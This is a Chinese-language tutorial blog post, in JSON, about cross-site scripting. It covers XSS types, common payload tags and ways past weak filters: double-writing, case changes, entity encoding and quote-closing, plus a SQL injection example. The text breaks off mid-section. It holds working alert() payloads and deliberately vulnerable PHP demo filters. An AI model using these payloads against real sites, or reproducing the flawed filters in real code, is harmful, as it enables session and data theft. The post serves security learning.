{"title":"XSS常见绕过姿势和绕某狗WAF所用标签小记","uid":"ff5ef1580e1509b5812626f28a444a2d","slug":"XSS常见绕过姿势和绕某狗WAF所用标签小记","date":"2022-07-11T10:32:20.000Z","updated":"2024-02-14T07:37:02.000Z","comments":true,"path":"api/articles/XSS常见绕过姿势和绕某狗WAF所用标签小记.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141536202.png","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>之前在XSS方面只有很浅的了解，再次学习过后，这里对其部分知识进行总结，同时用例题来讲解，希望能对在学习XSS的师傅有所帮助</p>\n<h1 id=\"什么是XSS\"><a href=\"#什么是XSS\" class=\"headerlink\" title=\"什么是XSS\"></a>什么是XSS</h1><p>XSS，全拼<code>Cross Site Scripting</code>，中文含义是<code>跨站脚本攻击</code>，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS</p>\n<h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>恶意攻击者在网站中插入恶意script代码，当web用户访问此网站时，恶意script代码被触发，就达到了攻击用户的目的，获取了用户的部分信息</p>\n<h2 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、窃取管理员帐号或Cookie，入侵者可以冒充管理员的身份登录后台。使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。\n<span class=\"token number\">2</span>、窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。\n<span class=\"token number\">3</span>、网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。\n<span class=\"token number\">4</span>、发送广告或者垃圾信息。攻击者可以利用<span class=\"token constant\">XSS</span>漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"漏洞分类\"><a href=\"#漏洞分类\" class=\"headerlink\" title=\"漏洞分类\"></a>漏洞分类</h2><h3 id=\"反射型XSS\"><a href=\"#反射型XSS\" class=\"headerlink\" title=\"反射型XSS\"></a>反射型XSS</h3><p>反射型XSS也被称为非持久性XSS，当用户访问一个带有XSS代码的HTML请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，就造成XSS漏洞，这个过程就像一次反射，所以叫反射型XSS。</p>\n<p>攻击流程如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、攻击者发送带有<span class=\"token constant\">XSS</span>恶意的脚本链接给客户<span class=\"token punctuation\">(</span>该链接是正常服务器存在注入点的链接，且带着我们注入的内容<span class=\"token punctuation\">)</span>\n<span class=\"token number\">2</span>、客户点击了恶意链接并访问了正常服务器\n<span class=\"token number\">3</span>、服务器将<span class=\"token constant\">XSS</span>与页面信息返回客户端\n<span class=\"token number\">4</span>、客户端解析后请求恶意服务器\n<span class=\"token number\">5</span>、攻击者读取用户信息<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"存储型XSS\"><a href=\"#存储型XSS\" class=\"headerlink\" title=\"存储型XSS\"></a>存储型XSS</h3><p>存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本漏洞，当攻击者提交一段 XSS代码后，被服务端接收并存储，当攻击者或用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这是存储型XSS。</p>\n<p>流程如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、攻击者在正常服务器中注入<span class=\"token constant\">XSS</span>代码，且被服务器储存在了数据库中\n<span class=\"token number\">2</span>、用户在网站登录状态下，访问了恶意服务器，且浏览了存在恶意脚本的页面\n<span class=\"token number\">3</span>、正常服务器将页面信息与<span class=\"token constant\">XSS</span>脚本一同返回\n<span class=\"token number\">4</span>、客户端解析了页面信息与<span class=\"token constant\">XSS</span>脚本代码，这时脚本代码会被执行，甚至会向攻击者的恶意服务器主动发起请求\n<span class=\"token number\">5</span>、此时，攻击者就可以从自己的恶意服务器中读取用户数据<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"DOM型\"><a href=\"#DOM型\" class=\"headerlink\" title=\"DOM型\"></a>DOM型</h3><p>不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。(属于是反射型的特殊情况)<br>可能触发类型</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">document<span class=\"token operator\">.</span>referer\nwindow<span class=\"token operator\">.</span>name\nlocation\ninnerHTML\ndocumen<span class=\"token operator\">.</span>write<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"攻击常用标签\"><a href=\"#攻击常用标签\" class=\"headerlink\" title=\"攻击常用标签\"></a>攻击常用标签</h1><h2 id=\"script标签\"><a href=\"#script标签\" class=\"headerlink\" title=\"script标签\"></a>script标签</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、<span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>alert<span class=\"token operator\">></span><span class=\"token comment\">//弹出1</span>\n<span class=\"token number\">2</span>、<span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"xss\"</span>）<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>alert<span class=\"token operator\">></span><span class=\"token comment\">//弹出xss</span>\n<span class=\"token number\">3</span>、<span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>xss<span class=\"token operator\">/</span>）<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>alert<span class=\"token operator\">></span><span class=\"token comment\">//弹出xss</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"img标签\"><a href=\"#img标签\" class=\"headerlink\" title=\"img标签\"></a>img标签</h2><pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token operator\">&lt;</span>img  src<span class=\"token operator\">=</span>javascript<span class=\"token operator\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span>\n<span class=\"token comment\">//调用js代码弹1</span>\n<span class=\"token operator\">&lt;</span>img  src<span class=\"token operator\">=</span><span class=\"token number\">1</span>  οnerrοr<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span> \n<span class=\"token comment\">//访问1这个地址对应的图片，如果错误就执行onerror里的代码，因为1不是一个链接，故会执行后面的语句，从而弹出1</span>\n<span class=\"token operator\">&lt;</span>img src<span class=\"token operator\">=</span><span class=\"token number\">1</span> onmouseover<span class=\"token operator\">=</span><span class=\"token string\">\"alert(1)\"</span><span class=\"token operator\">></span>\n<span class=\"token comment\">//鼠标指针移动到元素时触发弹出1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"a标签\"><a href=\"#a标签\" class=\"headerlink\" title=\"a标签\"></a>a标签</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>javascript<span class=\"token punctuation\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'xss'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span>quan9i<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span>\n<span class=\"token comment\">//点击quan9i这个链接触发js，弹出xss</span>\n<span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> onclick<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'xss'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span>a<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span>\n<span class=\"token comment\">//原理同上</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"input标签\"><a href=\"#input标签\" class=\"headerlink\" title=\"input标签\"></a>input标签</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>input onfocus<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"alert('xss');\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input onblur<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"xss\"</span><span class=\"token punctuation\">)</span> autofocus<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>input autofocus<span class=\"token operator\">></span>\n<span class=\"token comment\">//使得焦点自动到元素上，自动触发代码，弹出xss</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"body标签\"><a href=\"#body标签\" class=\"headerlink\" title=\"body标签\"></a>body标签</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>body οnlοad<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"svg标签\"><a href=\"#svg标签\" class=\"headerlink\" title=\"svg标签\"></a>svg标签</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>svg onload<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"iframe标签\"><a href=\"#iframe标签\" class=\"headerlink\" title=\"iframe标签\"></a>iframe标签</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>iframe onload<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"xss\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>iframe<span class=\"token operator\">></span>\n<span class=\"token comment\">//onload:当页面加载完毕时执行代码，在这里也就是弹出xss</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h1 id=\"常用绕过姿势\"><a href=\"#常用绕过姿势\" class=\"headerlink\" title=\"常用绕过姿势\"></a>常用绕过姿势</h1><h2 id=\"双写及大小写绕过\"><a href=\"#双写及大小写绕过\" class=\"headerlink\" title=\"双写及大小写绕过\"></a>双写及大小写绕过</h2><p>在遇到直接把<code>script</code>替换为空的过滤方式时，可以采用双写方式，构造script，举个栗子<code>&lt;scrscriptipt&gt;</code>，此时按照过滤方式，中间的script被替换为空，那此时剩下的部分就是<code>&lt;script&gt;</code>，也就成功绕过了。<br>测试代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$data</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"script\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hello <span class=\"token interpolation\"><span class=\"token variable\">$name</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>正常情况</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>quan9i<span class=\"token operator\">/</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534689.png\" alt=\"在这里插入图片描述\"><br>双写绕过时</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">name<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>scrscriptipt<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>quan9i<span class=\"token operator\">/</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>scrscriptipt<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534624.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534651.png\" alt=\"在这里插入图片描述\"><br>可以发现成功绕过了，错误的过滤方式甚至可以帮助我们绕过GOOgle浏览器的XSS过滤器</p>\n<p>遇到没有考虑大小写时，可以通过大小写的变化来进行绕过，比如<code>&lt;SCriPT&gt;</code><br>测试代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/script/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$payload</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"hacker!!!\"</span><span class=\"token punctuation\">;</span>   \n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$payload</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you are <span class=\"token interpolation\"><span class=\"token variable\">$name</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>正常情况</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">name<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'quan9i'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>结果如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534641.png\" alt=\"在这里插入图片描述\"><br>大小写绕过时</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">name<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>SCRipt<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'quan9i'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>SCRipt<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>结果如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534827.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"实体编码绕过（输出在标签属性中）\"><a href=\"#实体编码绕过（输出在标签属性中）\" class=\"headerlink\" title=\"实体编码绕过（输出在标签属性中）\"></a>实体编码绕过（输出在标签属性中）</h2><p>如果<code>&lt;</code>和<code>&gt;</code>被过滤，我们无法引入新标签，此时可以引入标签的事件，例如<code>onload</code>这些，而如果存在内容过滤，例如这种</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"alert(1)\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"ale_rt(1)\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p> 此时我们就可以用HTML编码来绕过检测<br> <img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534654.png\" alt=\"在这里插入图片描述\"><br>得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&amp;</span><span class=\"token comment\">#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这时候放入我们的事件中即可，比如是img标签，我们就可以引入一个onerror事件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>img src<span class=\"token operator\">=</span><span class=\"token number\">1</span> oneerror<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;\"</span><span class=\"token operator\">/</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时就可以触发弹窗，能触发与浏览器渲染页面的顺序有关。我们的payload在标签属性中，在触发事件前，浏览器已经对其进行了一次解码，也就把<code>&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code>变成了<code>alert(1)</code></p>\n<h2 id=\"闭合语句绕过\"><a href=\"#闭合语句绕过\" class=\"headerlink\" title=\"闭合语句绕过\"></a>闭合语句绕过</h2><p>当遇到无法构造<code>&lt;</code>和<code>&gt;</code>被过滤时，我们可以闭合JavaScript语句，使得攻击语句逃逸，示例代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"xianzhi\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"'.<span class=\"token interpolation\"><span class=\"token variable\">$payload</span></span>.'\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时的payload是可控的，我们构造payload为<code>&quot; onclick=alert(1)  type=&quot;text&quot;//</code>，此时在源代码中就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"xianzhi\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> onclick<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text\"</span><span class=\"token comment\">//\" type=\"hidden\"></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时后面相当于注释，不再看，而<code>//</code>则同时发挥了闭合的作用。使得成功弹窗<br>但有经验的程序员往往会想到这点，从而直接将<code>&#39;</code>进行转义，进而防御xss，但在部分情况下仍然存在注入。例如SQL中的双输入情况</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">select <span class=\"token operator\">*</span> from users where name <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'输入1'</span> <span class=\"token keyword\">and</span> pass <span class=\"token operator\">=</span>  <span class=\"token string single-quoted-string\">'输入2'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>我们此时在输入1中输入<code>\\</code>，在输入2中输入<code>union select xxxxxx#</code>，就成功进行了攻击，此时语句为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">select <span class=\"token operator\">*</span> from users where name <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'\\' and pass =  '</span>union select xxxxxx<span class=\"token comment\">#';</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>\\将第二个<code>&#39;</code>转义，导致第一个单引号与第三个单引号闭合，此时我们攻击语句构造完成后，在最后加上#，#把后面单引号注释，就成功实现了攻击语句逃逸。<br>在XSS中也同样存在这种情况，示例代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token constant\">ENT_QUOTES</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$address</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$address</span><span class=\"token operator\">=</span><span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$address</span><span class=\"token punctuation\">,</span><span class=\"token constant\">ENT_QUOTES</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">HTML</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meata</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>gb18030<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>xianzhi<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/javascript<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n        <span class=\"token keyword\">var</span> url<span class=\"token operator\">=</span><span class=\"token string\">'http://xz.com/?name<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?=</span><span class=\"token variable\">$name</span><span class=\"token delimiter important\">?></span></span>'</span><span class=\"token operator\">+</span><span class=\"token string\">'<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?=</span><span class=\"token variable\">$address</span><span class=\"token delimiter important\">?></span></span>'</span><span class=\"token punctuation\">;</span>\n    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>输入点有两个，分别是<code>name</code>和<code>addr</code>，输出点也是这两个，这里如果输入单引号的话，因为有<br><code>htmlentities函数</code>，所以会转换为实体编码，此时我们看这个语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">var url='http://xz.com/?name<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?=</span><span class=\"token variable\">$name</span><span class=\"token delimiter important\">?></span></span>'+'<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?=</span><span class=\"token variable\">$address</span><span class=\"token delimiter important\">?></span></span>';<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这个<code>name</code>变量后面是<code>单引号</code>，如果我们给它转义了，第一个就会与第三个闭合，我们再用<code>//</code>进行注释，就可以实现攻击语句逃逸，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">name<span class=\"token operator\">=</span>xianzhi\\<span class=\"token operator\">&amp;</span>addr<span class=\"token operator\">=</span><span class=\"token punctuation\">;</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>xianzhi<span class=\"token operator\">/</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534356.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534277.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"绕过空格\"><a href=\"#绕过空格\" class=\"headerlink\" 